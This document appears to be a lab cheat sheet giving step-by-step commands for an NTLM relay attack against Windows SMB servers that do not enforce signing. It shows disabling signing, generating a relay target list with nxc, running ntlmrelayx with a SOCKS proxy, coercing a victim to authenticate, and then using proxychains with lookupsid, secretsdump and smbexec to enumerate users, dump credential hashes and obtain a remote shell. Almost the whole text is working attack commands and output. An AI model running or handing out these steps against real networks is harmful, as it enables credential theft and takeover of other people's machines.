This attack is only possible if signing is disabled

## Check if signing is enabled 

```powershell
Get-SmbServerConfiguration | Select EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature
```

Disable signing from GPO
```powershell
Set-SmbClientConfiguration -RequireSecuritySignature $false
```

## Execution steps

### Obtain list of SMB servers that do not enforce signing and that cantherefore be relayed.
  
```sh
nxc smb 192.168.122.30 --gen-relay-list out.txt
```

### Start server to replay Net-NTLM hash
  
```sh
sudo ntlmrelayx.py --no-http-server -smb2support -t smb://192.168.122.30 -socks
```

### Within the windows machine, force the victim to execute

```powershell
dir \\192.168.122.1\test
```

### At this point we have established an authenticated SOCKS proxy
```powershell
  | ntlmrelayx> socks
  | Protocol  Target          Username               AdminStatus  Port 
  | --------  --------------  ---------------------  -----------  ----
  | SMB       192.168.122.30  HEXDUMP/ADMINISTRATOR  TRUE         445  
```


  We can use `proxychains` to proxy our commands using the authenticated session 
  
#### lookupsid.py
```sh
proxychains lookupsid.py -no-pass -domain-sids hexdump/administrator@192.168.122.30
```

#### secretsdump.py
```sh
proxychains secretsdump.py -no-pass hexdump/administrator@192.168.122.30  
```

#### smbexec.py
```sh
proxychains smbexec.py -no-pass hexdump/administrator@192.168.122.30
```